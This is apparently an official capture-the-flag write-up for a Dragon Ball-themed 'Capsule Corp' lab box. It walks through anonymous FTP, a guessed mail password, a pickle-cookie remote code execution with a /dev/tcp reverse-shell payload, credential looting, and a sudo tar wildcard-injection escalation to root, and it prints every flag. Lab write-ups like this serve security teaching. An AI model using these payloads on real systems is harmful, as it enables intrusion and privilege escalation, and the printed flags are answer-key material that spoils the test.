# Capsule Corporation — Official Writeup

| | |
|---|---|
| **Box** | Capsule Corp (`capsulecorp.htb`) |
| **Difficulty** | Medium |
| **Theme** | Dragon Ball / Capsule Corp — "Reunir las 7 Esferas del Dragón" |
| **Key vulns** | CVE-2024-42069 insecure deserialization (CWE-502) → `sudo` tar wildcard injection |
| **User flag** | `HTB{us3r_g0ku_p0w3r_l3v3l_9000}` |
| **Root flag** | `HTB{r00t_sh3nl0ng_gr4nts_y0ur_w1sh}` |
| **Bonus** | `HTB{t1m3_p4r4d0x_4ll_b4lls}` (collect all 7 dragon balls) |

> **Story.** You are an IT worker at Capsule Corp in **2024**. While reviewing
> historical incident logs you find a CVE that was live back in **2015**. You
> slip into the room with the time machine, travel to the past where the bug is
> still exploitable, and collect the **7 Dragon Balls** from Capsule Corp's
> systems. The whole stack is dated to 2015; you, the attacker from the future,
> already know the CVE — which is why everything is still vulnerable.

---

## 0. Dragon ball scoreboard

| Ball | Where | Flag |
|------|-------|------|
| 1 star | FTP anonymous | `CAPSULE{0n3_st4r_ftp_4n0nym0us}` |
| 2 star | POP3 mailbox attachment | `CAPSULE{tw0_st4rs_p0p3_m41lb0x}` |
| 3 star | Web deserialization RCE | `CAPSULE{thr33_st4rs_w3b_d3s3r14l}` |
| 4 star | Hidden radar cache | `CAPSULE{f0ur_st4rs_h1dd3n_c0nf1g}` |
| 5 star | goku's home | `CAPSULE{f1v3_st4rs_g0ku_h0m3}` |
| 6 star | sudo wildcard root loot | `CAPSULE{s1x_st4rs_sud0_w1ldc4rd}` |
| 7 star | Shenlong altar | `CAPSULE{s3v3n_st4rs_w1sh_gr4nt3d}` |

---

## 1. Recon

```bash
nmap -sC -sV -p- --min-rate 2000 capsulecorp.htb
```

```
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH (Capsule Corp 2015 banner)
80/tcp   open  http    nginx 1.18.0  ("Dragon Radar Dashboard")
110/tcp  open  pop3    Dovecot pop3d
```

Four services. The HTTP `Server: nginx/1.18.0` header and a POP3 service on 110
are the first hints that this is an older, mail-driven environment.

---

## 2. FTP — anonymous (ball #1)

```bash
ftp capsulecorp.htb        # user: anonymous, blank password
ftp> ls
ftp> get employee_roster.txt
ftp> get network_diagram.png
ftp> get README_2024.txt
ftp> get dragon_ball_1.txt
```

`dragon_ball_1.txt` -> **`CAPSULE{0n3_st4r_ftp_4n0nym0us}`**

`employee_roster.txt` enumerates users and drops a hint:

```
bulma   - R&D Director      - mailbox enabled (POP3)
goku    - Field Tester      - dashboard access
vegeta  - Security (elite)  - no remote access
NOTE: reset weak passwords (looking at you, bulma...).
```

`network_diagram.png` confirms POP3 (110) exposes employee mailboxes.

> **Easter egg #1.** `README_2024.txt` carries a **2024** mtime while every
> other file is dated 2015 (`ls -l` shows it). It reads: *"If you're reading
> this, the time machine worked... The CVE is still live here. Good luck, past
> me."* Non-blocking flavour that explains why everything is vulnerable.

---

## 3. POP3 — bulma's mailbox (ball #2)

The roster hints bulma reuses a weak password. The obvious Dragon Ball guess
works: **`bulma:dragon`**.

```bash
nc capsulecorp.htb 110
USER bulma
PASS dragon
LIST          # exactly 3 messages
RETR 1
RETR 2
RETR 3
```

- **Email 1** (from bulma to goku): *"your dashboard password is: **9000**"* —
  the web credential.
- **Email 2** (from vegeta): the internal disclosure of **CVE-2024-42069** —
  the `radar_session` cookie is an unsigned pickle, current version **2.4.1**
  is vulnerable, patch to 2.4.2. (Vegeta even notes the absurd 2024 ticket
  number on a 2015 bug.)
- **Email 3** ("keepsake"): a base64 MIME attachment `dragon_ball_2.txt`.

Decode the attachment:

```bash
# copy the base64 block from RETR 3 into ball2.b64, then:
base64 -d ball2.b64
```

-> **`CAPSULE{tw0_st4rs_p0p3_m41lb0x}`**

We now have: web creds `goku:9000`, and the exact vulnerable version (2.4.1).

---

## 4. Web — Dragon Radar Dashboard

Browse to `http://capsulecorp.htb/` and log in with **`goku:9000`**.

The dashboard footer reveals the version and a second easter egg:

```
Dragon Radar Dashboard v2.4.1 — build 2015-04-18
Changelog: v2.4.2 (2024-07-30) — "Patched insecure radar_session
deserialization."  [update scheduled — how is this dated after today?]
```

> **Easter egg #2.** The "fix" (v2.4.2) is dated **2024-07-30**, *after* the
> server's own 2015 build date — an impossible changelog entry that confirms
> the deployed 2.4.1 is the vulnerable version.

Inspect the session cookie set at login:

```bash
# radar_session is base64; decode it:
echo '<radar_session value>' | base64 -d | xxd | head
```

The bytes are a **Python pickle** (dict with ASCII keys like `user`,
`authenticated`). No HMAC suffix, no signature — it is raw, unsigned pickle. The
full advisory is even served at `http://capsulecorp.htb/security/CVE-2024-42069`.

---

## 5. CVE-2024-42069 — pickle RCE (ball #3)

Because the server runs `pickle.loads(base64.b64decode(radar_session))` on every
request with no integrity check, we craft an object whose `__reduce__` runs a
command on deserialization.

```bash
# terminal 1: listener
nc -lvnp 4444

# terminal 2: fire the PoC (ships with the box)
python3 poc.py -t http://capsulecorp.htb -u goku -p 9000 --lhost 10.10.14.5 --lport 4444
```

Minimal manual version:

```python
import os, pickle, base64, requests
class RCE:
    def __reduce__(self):
        return (os.system, ("setsid bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' &",))
cookie = base64.b64encode(pickle.dumps(RCE())).decode()
requests.get("http://capsulecorp.htb/dashboard", cookies={"radar_session": cookie})
```

The listener catches a shell as **www-data**.

```bash
www-data@capsulecorp:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@capsulecorp:/$ cat /var/capsule/uploads/processed/dragon_ball_3.txt
```

-> **`CAPSULE{thr33_st4rs_w3b_d3s3r14l}`**

---

## 6. Post-exploitation as www-data (ball #4)

`config.py` is group-readable by www-data (`0640 capsule:www-data`):

```bash
www-data@capsulecorp:/$ cat /var/www/capsule/config.py
SECRET_KEY = "kamehameha2015"
...
SSH_USER = "goku"
SSH_PASS = "Kakar0t_SSH_2015!"
```

That is goku's **SSH** password (different from the web password). Also grab the
hidden cache flag:

```bash
www-data@capsulecorp:/$ cat /var/capsule/tmp/.radarcache/dragon_ball_4.txt
```

-> **`CAPSULE{f0ur_st4rs_h1dd3n_c0nf1g}`**

---

## 7. Lateral movement -> goku (ball #5 + user.txt)

```bash
ssh goku@capsulecorp.htb        # password: Kakar0t_SSH_2015!
goku@capsulecorp:~$ cat user.txt
```

-> **user flag: `HTB{us3r_g0ku_p0w3r_l3v3l_9000}`**

```bash
goku@capsulecorp:~$ cat training/memories/dragon_ball_5.txt
```

-> **`CAPSULE{f1v3_st4rs_g0ku_h0m3}`**

---

## 8. Privilege escalation -> root (ball #6)

```bash
goku@capsulecorp:~$ sudo -l
User goku may run the following commands on capsulecorp:
    (root) NOPASSWD: /usr/local/bin/radar-backup.sh *
```

`radar-backup.sh` `cd`s into the directory you pass and runs an **unquoted**
`tar czf ... *`. Any file whose name looks like a tar option is handed straight
to tar — the classic GTFOBins **tar `--checkpoint-action` wildcard injection**.

```bash
cd /tmp && mkdir pwn && cd pwn
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
echo > '--checkpoint=1'
echo > '--checkpoint-action=exec=sh shell.sh'

sudo /usr/local/bin/radar-backup.sh /tmp/pwn      # tar runs shell.sh as root
/tmp/rootbash -p                                  # SUID bash, keep privileges
```

```bash
rootbash-5.x# id
uid=1001(goku) gid=1001(goku) euid=0(root) groups=...
rootbash-5.x# cat /root/.secrets/dragon_ball_6.txt
```

-> **`CAPSULE{s1x_st4rs_sud0_w1ldc4rd}`**

---

## 9. Root (ball #7)

```bash
rootbash-5.x# cat /root/root.txt
rootbash-5.x# cat /opt/shenlong/altar/dragon_ball_7.txt
```

-> **root flag: `HTB{r00t_sh3nl0ng_gr4nts_y0ur_w1sh}`**
-> **`CAPSULE{s3v3n_st4rs_w1sh_gr4nt3d}`**

---

## 10. Summon Shenlong (bonus — easter egg #3)

`invoke_shenlong.sh` only grants the wish when all seven balls have been
**collected** into `/var/capsule/dragonballs/`. The box does **not** populate
that folder for you — you must copy each ball you found into it. (This is the
intended final step.)

```bash
# as root
D=/var/capsule/dragonballs
cp /srv/ftp/dragon_ball_1.txt                         $D/dragon_ball_1.txt
printf 'CAPSULE{tw0_st4rs_p0p3_m41lb0x}\n'            > $D/dragon_ball_2.txt   # from the POP3 attachment
cp /var/capsule/uploads/processed/dragon_ball_3.txt   $D/dragon_ball_3.txt
cp /var/capsule/tmp/.radarcache/dragon_ball_4.txt     $D/dragon_ball_4.txt
cp /home/goku/training/memories/dragon_ball_5.txt     $D/dragon_ball_5.txt
cp /root/.secrets/dragon_ball_6.txt                   $D/dragon_ball_6.txt
cp /opt/shenlong/altar/dragon_ball_7.txt              $D/dragon_ball_7.txt

/root/invoke_shenlong.sh
```

Shenlong rises and grants the wish:

-> **`HTB{t1m3_p4r4d0x_4ll_b4lls}`**

If any ball is missing, the script lists exactly which collection source you
still owe and exits non-zero.

---

## 11. Defensive takeaways

- **Never `pickle.loads` untrusted input.** Use signed JSON tokens
  (`itsdangerous`) with a server-side HMAC key. See
  `app/session_fixed.py.example` (the patched 2.4.2 design).
- **Don't reuse weak passwords** (`bulma:dragon`) and don't email plaintext
  credentials.
- **Don't keep secrets in world/group-readable config** (`config.py`).
- **Quote your globs** and avoid wildcards in `sudo`-reachable scripts; pin
  exact arguments in `sudoers` instead of a trailing `*`.

---

## Appendix — exploit chain at a glance

```
FTP anon (1) -> POP3 bulma:dragon (2, goku web pw, CVE)
   -> web goku:9000 -> pickle RCE www-data (3)
   -> config.py loot + cache (4) -> ssh goku (user.txt, 5)
   -> sudo tar wildcard -> root (6) -> root.txt + altar (7)
   -> collect 7 balls -> invoke_shenlong.sh -> bonus
```

No kernel exploit, no hash cracking — Medium by design.
